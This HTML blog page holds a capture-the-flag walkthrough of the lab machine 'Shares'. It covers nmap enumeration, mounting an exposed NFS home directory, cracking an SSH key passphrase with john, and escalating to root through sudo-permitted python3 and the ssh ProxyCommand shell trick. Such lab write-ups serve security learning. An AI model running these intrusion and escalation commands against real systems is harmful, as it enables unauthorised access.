<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap: PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.380/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))|_http-title: Pet Shop| http-methods:|_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind syn-ack 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33317/tcp6 mountd| 100005 1,2,3 47026/udp mountd| 100005 1,2,3 52045/tcp mountd| 100005 1,2,3 56412/udp6 mountd| 100021 1,3,4 33401/tcp nlockmgr| 100021 1,3,4 41275/tcp6 nlockmgr| 100021 1,3,4 44254/udp nlockmgr| 100021 1,3,4 60886/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl syn-ack 3 (RPC #100227)Service Info: OS: Unix27853/tcp open ssh syn-ack OpenSSH 7." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/cyberseclabs/shares/shares/" />


    <title>
        
            Shares :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Shares">
<meta itemprop="description" content="Enumeration nmap: PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.380/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))|_http-title: Pet Shop| http-methods:|_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind syn-ack 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33317/tcp6 mountd| 100005 1,2,3 47026/udp mountd| 100005 1,2,3 52045/tcp mountd| 100005 1,2,3 56412/udp6 mountd| 100021 1,3,4 33401/tcp nlockmgr| 100021 1,3,4 41275/tcp6 nlockmgr| 100021 1,3,4 44254/udp nlockmgr| 100021 1,3,4 60886/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl syn-ack 3 (RPC #100227)Service Info: OS: Unix27853/tcp open ssh syn-ack OpenSSH 7."><meta itemprop="datePublished" content="2022-09-16T18:33:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="769"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Shares"/>
<meta name="twitter:description" content="Enumeration nmap: PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.380/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))|_http-title: Pet Shop| http-methods:|_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind syn-ack 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33317/tcp6 mountd| 100005 1,2,3 47026/udp mountd| 100005 1,2,3 52045/tcp mountd| 100005 1,2,3 56412/udp6 mountd| 100021 1,3,4 33401/tcp nlockmgr| 100021 1,3,4 41275/tcp6 nlockmgr| 100021 1,3,4 44254/udp nlockmgr| 100021 1,3,4 60886/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl syn-ack 3 (RPC #100227)Service Info: OS: Unix27853/tcp open ssh syn-ack OpenSSH 7."/>



    <meta property="og:title" content="Shares" />
<meta property="og:description" content="Enumeration nmap: PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.380/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))|_http-title: Pet Shop| http-methods:|_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)111/tcp open rpcbind syn-ack 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 33317/tcp6 mountd| 100005 1,2,3 47026/udp mountd| 100005 1,2,3 52045/tcp mountd| 100005 1,2,3 56412/udp6 mountd| 100021 1,3,4 33401/tcp nlockmgr| 100021 1,3,4 41275/tcp6 nlockmgr| 100021 1,3,4 44254/udp nlockmgr| 100021 1,3,4 60886/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl syn-ack 3 (RPC #100227)Service Info: OS: Unix27853/tcp open ssh syn-ack OpenSSH 7." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/cyberseclabs/shares/shares/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-16T18:33:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="Cyberseclabs" />



    <meta property="article:published_time" content="2022-09-16 18:33:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/cyberseclabs/shares/shares/">Shares</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap:</h3>
<pre tabindex="0"><code>PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack vsftpd 3.0.3

80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Pet Shop
| http-methods:
|_ Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)

111/tcp open rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 33317/tcp6 mountd
| 100005 1,2,3 47026/udp mountd
| 100005 1,2,3 52045/tcp mountd
| 100005 1,2,3 56412/udp6 mountd
| 100021 1,3,4 33401/tcp nlockmgr
| 100021 1,3,4 41275/tcp6 nlockmgr
| 100021 1,3,4 44254/udp nlockmgr
| 100021 1,3,4 60886/udp6 nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
|_ 100227 3 2049/udp6 nfs_acl

2049/tcp open nfs_acl syn-ack 3 (RPC #100227)
Service Info: OS: Unix

27853/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyk8rqOZBxSEXCu+mZCgIQOiHcAg/2ivCFVqGH0ehzvIN3eFZ5jll3zDyKehhaSyYeouoQZbpUk4fmTEqPFdUGjOzXhUhf6pQ0atKx3hms+b5ZLaCL2UjburequfIHCfDCbt6Wbj7dozIMmQ4+qjPQqBkUci7DjCTA/LbxNPL47hoC+3vAvCgRxAK6Yq4tUlil3eSgHX9EeJSxJQpDShPjTZ384+DUMx3VJbXFNBtxsUblPeykzrM18Hill3Yy/D4L9ZW0PJ5P3W+cFQuHc3RWLXCY6S1WmHDxGcI2UA3f2UaBDn2zm3cmgt3yKWTuqY98NlSh880AzmAcS6HpDlY/
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDF3clGPfC6R84UaHxAMoGIYn58Njt+Dth8rsl/Aa8W9SXquC3L+TGPb5dVRArkmCgta+moG16PhstNUHlyNVbA=
|   256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKX5ZbEhRnQU7woPnhhFMtk+c0HJcj0T3xPfAWHTBH9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


36549/tcp open  mountd  syn-ack 1-3 (RPC #100005)

44829/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)

57327/tcp open  mountd  syn-ack 1-3 (RPC #100005)
</code></pre><p>There is a website running, a pet shop, and a nfs server.</p>
<p>There is not much information on the website and ftp doesn&rsquo;t allow anonymous login, we can try to enumerate the nfs server.</p>
<pre tabindex="0"><code>$showmount -e 172.31.1.7

Export list for 172.31.1.7:
/home/amir *.*.*.*
</code></pre><h2 id="exploitation">Exploitation</h2>
<p>Now we know there is a user called amir, and we can try to mount the amir folder on our machine</p>
<pre tabindex="0"><code>mount -t nfs 172.31.1.7:home/amir /mnt/TempNFS

drwxrwxr-x 5 nair0lf32 docker 4096  2 avril  2020 .
drwxr-xr-x 1 root      root     14 27 oct.  11:41 ..
-rw-r--r-- 1 nair0lf32 docker    0  2 avril  2020 .bash_history
-rw-r--r-- 1 nair0lf32 docker  220  4 avril  2018 .bash_logout
-rw-r--r-- 1 nair0lf32 docker 3786  2 avril  2020 .bashrc
drw-r--r-- 2 nair0lf32 docker 4096  2 avril  2020 .cache
drw-r--r-- 3 nair0lf32 docker 4096  2 avril  2020 .gnupg
-rw-r--r-- 1 nair0lf32 docker  807  4 avril  2018 .profile
drwxrwxr-x 2 nair0lf32 docker 4096  2 avril  2020 .ssh
-rw-r--r-- 1 nair0lf32 docker    0  2 avril  2020 .sudo_as_admin_successful
-rw-r--r-- 1 nair0lf32 docker 7713  2 avril  2020 .viminfo
</code></pre><p>We have access to the .ssh folder with amir&rsquo;s private id_rsa key. We crack that:<br>
First we use:</p>
<p><code>python2 /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.john</code></p>
<p>to get a john formatted hash file, then we run john on the hash file:</p>
<pre tabindex="0"><code>john -w=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
hello6           (id_rsa)
1g 0:00:00:08 DONE (2021-10-27 11:52) 0.1213g/s 1740Kp/s 1740Kc/s 1740KC/sa6_123..*7¡Vamos!
Session completed


ssh creds:
amir:hello6
</code></pre><p>Now we can ssh as amir using his key&hellip;note that ssh is not on port 22</p>
<pre tabindex="0"><code>ssh amir@172.31.1.7 -i id_rsa -p 27853

amir@shares:/home$ ls
amir  amy
</code></pre><p>There seem to be another user called amy and as amir&rsquo;s folder is empty I guess our user flag is owned by amy.</p>
<p>We check sudo rights for possible lateral movement:</p>
<pre tabindex="0"><code>$ sudo -l
Matching Defaults entries for amir on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amir may run the following commands on shares:
    (ALL : ALL) ALL
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: /usr/bin/python3
</code></pre><p>And we can. we can run either python or pkexec as amy.
I chose python because I already know how to work with that one. Gotta explore pkexec too later.</p>
<pre tabindex="0"><code>sudo -u amy /usr/bin/python3 -c &#39;import os; os.system(&#34;/bin/bash&#34;)&#39;
</code></pre><p>And now we are amy. We get User Flag in amy&rsquo;s home folder:<br>
<code>cat access.txt</code></p>
<p>Now its Privilege Escalation time:</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<pre tabindex="0"><code>amy@shares:/home/amy$ sudo -l
Matching Defaults entries for amy on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amy may run the following commands on shares:
    (ALL) NOPASSWD: /usr/bin/ssh
</code></pre><p>Uh ok amy can run ssh as root? let&rsquo;s ask Gtfobins for help here</p>
<p><code>sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x</code></p>
<p>And Its done, we are root. flag is in the root folder:</p>
<p><code> cat system.txt</code></p>
<p>And that&rsquo;s it. If you are curious enough remember to try the other way around. and find other methods to get the flags.</p>
<p>By example it seems there is a possible escalation with lxd from amir &lsquo;id command&rsquo; to root.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/cyberseclabs/">Cyberseclabs</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
